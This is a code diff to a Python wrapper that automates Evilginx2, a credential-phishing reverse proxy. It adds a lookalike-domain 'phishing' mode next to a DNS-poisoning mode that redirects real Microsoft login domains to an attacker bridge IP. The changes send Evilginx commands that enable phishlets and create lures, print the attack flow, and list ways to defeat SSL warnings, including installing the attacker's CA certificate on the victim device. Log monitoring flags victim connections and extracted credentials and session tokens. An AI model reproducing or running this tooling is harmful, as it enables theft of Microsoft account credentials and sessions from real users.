@@ -578,6 +578,8 @@ class EvilginxManager:
         self.log_monitor_thread = None
         self.stop_monitoring = False
         self.log_file = '/tmp/evilginx.log'
+        self.mode = 'transparent'  # 'transparent' or 'phishing'
+        self.custom_domain = None  # User's phishing domain
 
     def check_installation(self):
         """Check if Evilginx2 is installed"""
@@ -618,8 +620,14 @@ redirect_url: https://www.microsoft.com
             log(f"Config setup failed: {e}", 'ERROR')
             return False
 
-    def start(self, phishlet='o365', domain=None):
-        """Start Evilginx2 process"""
+    def start(self, phishlet='o365', domain=None, mode='transparent'):
+        """Start Evilginx2 process
+        
+        Args:
+            phishlet: The phishlet to use (o365, outlook, etc.)
+            domain: Custom domain for phishing mode (optional)
+            mode: 'transparent' (DNS poisoning to bridge IP) or 'phishing' (redirect to custom domain)
+        """
         if self.running and self.process and self.process.poll() is None:
             log("Evilginx2 already running", 'WARNING')
             return True
@@ -629,33 +637,48 @@ redirect_url: https://www.microsoft.com
             return False
 
         try:
-            log(f"Starting Evilginx2 with {phishlet} phishlet...")
+            self.mode = mode
+            log(f"Starting Evilginx2 with {phishlet} phishlet in {mode} mode...")
             
-            # For DNS poisoning attacks, use real Microsoft domains
-            if not domain:
-                if phishlet == 'o365':
-                    domain = 'login.microsoftonline.com'
-                    # Poison multiple Microsoft auth domains
-                    self.domains_to_poison = [
-                        'login.microsoftonline.com',
-                        'account.microsoft.com',
-                        'login.microsoft.com',
-                        'portal.office.com'
-                    ]
-                    log("Using REAL domains for DNS poisoning")
-                elif phishlet == 'outlook':
-                    domain = 'login.live.com'
-                    self.domains_to_poison = [
-                        'login.live.com',
-                        'account.live.com',
-                        'outlook.live.com'
-                    ]
-                    log("Using REAL domains for DNS poisoning")
-                else:
-                    domain = f'{phishlet}.local'
-                    self.domains_to_poison = [domain]
+            # Determine target domain based on mode
+            if mode == 'phishing' and domain:
+                # PHISHING MODE: User provides their own domain with valid SSL cert
+                # Example: user owns "micr0soft-login.com" with Let's Encrypt cert
+                log(f"PHISHING MODE: Using custom domain: {domain}", 'INFO')
+                log("Victim will see YOUR domain in browser (not transparent!)", 'WARNING')
+                self.custom_domain = domain
+                self.domains_to_poison = []  # Don't poison Microsoft domains
+                target_domain = domain
+                
             else:
-                self.domains_to_poison = [domain]
+                # TRANSPARENT MODE: Use real Microsoft domains (DNS poisoning)
+                log("TRANSPARENT MODE: Using real Microsoft domains", 'INFO')
+                log("Requires SSL certificate bypass on victim device!", 'WARNING')
+                self.mode = 'transparent'
+                
+                if not domain:
+                    if phishlet == 'o365':
+                        target_domain = 'login.microsoftonline.com'
+                        # Poison multiple Microsoft auth domains
+                        self.domains_to_poison = [
+                            'login.microsoftonline.com',
+                            'account.microsoft.com',
+                            'login.microsoft.com',
+                            'portal.office.com'
+                        ]
+                    elif phishlet == 'outlook':
+                        target_domain = 'login.live.com'
+                        self.domains_to_poison = [
+                            'login.live.com',
+                            'account.live.com',
+                            'outlook.live.com'
+                        ]
+                    else:
+                        target_domain = f'{phishlet}.local'
+                        self.domains_to_poison = [target_domain]
+                else:
+                    target_domain = domain
+                    self.domains_to_poison = [domain]
             
             self.phishlet = phishlet
             
@@ -707,12 +730,37 @@ redirect_url: https://www.microsoft.com
                 preexec_fn=os.setpgrp
             )
             
-            # Configuration commands for DNS poisoning mode
-            cmd_sequence = f"""config domain {domain}
+            # Configuration commands based on mode
+            if self.mode == 'phishing':
+                # Phishing mode: Use custom domain, no DNS poisoning needed
+                cmd_sequence = f"""config domain {target_domain}
 config ip {self.bridge_ip}
-phishlets hostname {phishlet} {domain}
+phishlets hostname {phishlet} {target_domain}
+phishlets enable {phishlet}
+lures create {phishlet}
+lures get-url 0
+"""
+            else:
+                # Transparent mode: Use real domain, DNS poisoning required
+                cmd_sequence = f"""config domain {target_domain}
+config ip {self.bridge_ip}
+phishlets hostname {phishlet} {target_domain}
 phishlets enable {phishlet}
 """
+            
+            log("=" * 60)
+            log(f"EVILGINX CONFIGURATION ({self.mode.upper()} MODE):", 'INFO')
+            log(f"  Target Domain: {target_domain}", 'INFO')
+            log(f"  Bridge IP: {self.bridge_ip}", 'INFO')
+            log(f"  Phishlet: {phishlet}", 'INFO')
+            log(f"  Mode: {self.mode}", 'INFO')
+            if self.mode == 'phishing':
+                log(f"  Custom Domain: {self.custom_domain}", 'INFO')
+                log(f"  Note: Victim will see {self.custom_domain} in browser!", 'WARNING')
+            log(f"  Commands to send:", 'INFO')
+            for line in cmd_sequence.strip().split('\n'):
+                log(f"    > {line}", 'INFO')
+            log("=" * 60)
             
             # Send configuration commands
             time.sleep(2)
@@ -720,9 +768,20 @@ phishlets enable {phishlet}
                 try:
                     self.process.stdin.write(cmd_sequence.encode())
                     self.process.stdin.flush()
-                    log("Configuration commands sent")
+                    log("Configuration commands sent to Evilginx", 'SUCCESS')
+                    
+                    # Wait for Evilginx to process commands
+                    time.sleep(2)
+                    
+                    # Send additional verification command
+                    self.process.stdin.write(b"phishlets\n")
+                    self.process.stdin.flush()
+                    log("Requested phishlet status verification")
+                    
                 except Exception as e:
-                    log(f"Failed to send commands: {e}", 'WARNING')
+                    log(f"Failed to send commands: {e}", 'ERROR')
+                    import traceback
+                    log(traceback.format_exc(), 'ERROR')
             
             time.sleep(3)
             
@@ -744,22 +803,42 @@ phishlets enable {phishlet}
                 self.log_monitor_thread = threading.Thread(target=self._monitor_logs, daemon=True)
                 self.log_monitor_thread.start()
                 
-                log(f"Evilginx2 started (PID: {self.process.pid})", 'SUCCESS')
-                log(f"Phishlet: {phishlet}")
-                log(f"Primary domain: {domain}")
-                log(f"Bridge IP: {self.bridge_ip}")
-                log(f"Database: {self.db_path}")
-                log(f"Config dir: {self.config_dir}")
-                log(f"")
-                log(f"DNS POISONING ACTIVE:", 'SUCCESS')
-                log(f"  Intercepting DNS queries for:")
+                log("=" * 60, 'SUCCESS')
+                log("EVILGINX2 STARTED SUCCESSFULLY!", 'SUCCESS')
+                log("=" * 60, 'SUCCESS')
+                log(f"Process ID: {self.process.pid}", 'INFO')
+                log(f"Phishlet: {phishlet}", 'INFO')
+                log(f"Primary domain: {domain}", 'INFO')
+                log(f"Bridge IP: {self.bridge_ip}", 'INFO')
+                log(f"Listening on: https://{self.bridge_ip}:443 and http://{self.bridge_ip}:80", 'INFO')
+                log(f"Database: {self.db_path}", 'INFO')
+                log(f"Config dir: {self.config_dir}", 'INFO')
+                log(f"Log file: /var/log/nac-captures/evilginx.log", 'INFO')
+                log("")
+                log("DNS POISONING ACTIVE:", 'SUCCESS')
+                log("  Intercepting DNS queries for:")
                 for d in self.domains_to_poison:
                     log(f"    - {d} -> {self.bridge_ip}")
-                log(f"  Victim traffic automatically redirected to Evilginx")
-                log(f"  No lure needed - user visits Microsoft normally")
-                log(f"")
-                log(f"Session monitoring started - checking for captures every 5s")
-                log(f"Real-time activity monitoring enabled", 'SUCCESS')
+                log("")
+                log("ATTACK FLOW:", 'INFO')
+                log(f"  1. Victim queries {domain} -> DNS returns {self.bridge_ip}", 'INFO')
+                log(f"  2. Victim connects to https://{self.bridge_ip}", 'INFO')
+                log(f"  3. Evilginx proxies to real {domain}", 'INFO')
+                log(f"  4. Sessions captured to database", 'INFO')
+                log("")
+                log("SSL CERTIFICATE WARNING:", 'WARNING')
+                log("  Victim will see SSL certificate warning!", 'WARNING')
+                log("  Modern browsers will block self-signed certificates", 'WARNING')
+                log("")
+                log("TO BYPASS SSL WARNING (for testing):", 'INFO')
+                log("  Option 1: Click 'Advanced' -> 'Proceed Anyway' in browser", 'INFO')
+                log("  Option 2: Use Firefox with security.enterprise_roots.enabled=true", 'INFO')
+                log("  Option 3: Install Evilginx CA cert on victim device", 'INFO')
+                log(f"  Option 4: Check {self.config_dir} for certificate files", 'INFO')
+                log("")
+                log("Session monitoring started - checking every 5s", 'SUCCESS')
+                log("Real-time activity monitoring enabled", 'SUCCESS')
+                log("=" * 60, 'SUCCESS')
                 return True
             else:
                 log("Evilginx2 failed to start - check logs", 'ERROR')
@@ -952,10 +1031,21 @@ phishlets enable {phishlet}
                                 # Detect interesting events
                                 lower_line = line.lower()
                                 
+                                # SSL/TLS errors
+                                if 'tls' in lower_line or 'ssl' in lower_line or 'certificate' in lower_line:
+                                    if 'error' in lower_line or 'fail' in lower_line:
+                                        log(f"SSL/TLS ERROR: {line.strip()}", 'ERROR')
+                                    elif 'handshake' in lower_line:
+                                        log(f"TLS HANDSHAKE from victim", 'INFO')
+                                
                                 # HTTP/HTTPS connections to phishing domain
                                 if any(d in lower_line for d in self.domains_to_poison):
                                     if 'request' in lower_line or 'GET' in line or 'POST' in line:
-                                        log(f"VICTIM VISITING PHISHING SITE", 'WARNING')
+                                        log(f"HTTP REQUEST from victim", 'INFO')
+                                
+                                # Connection attempts
+                                if 'new connection' in lower_line or 'client connected' in lower_line:
+                                    log(f"VICTIM CONNECTED!", 'SUCCESS')
                                 
                                 # Authentication attempts
                                 if 'auth' in lower_line or 'login' in lower_line or 'signin' in lower_line:
@@ -969,6 +1059,10 @@ phishlets enable {phishlet}
                                 if 'cookie' in lower_line or 'token' in lower_line:
                                     if 'captured' in lower_line or 'saved' in lower_line:
                                         log(f"CREDENTIALS EXTRACTED", 'SUCCESS')
+                                
+                                # Phishlet errors
+                                if 'phishlet' in lower_line and 'error' in lower_line:
+                                    log(f"PHISHLET ERROR: {line.strip()}", 'ERROR')
                                 
                                 # Keep set size manageable
                                 if len(seen_lines) > 500:
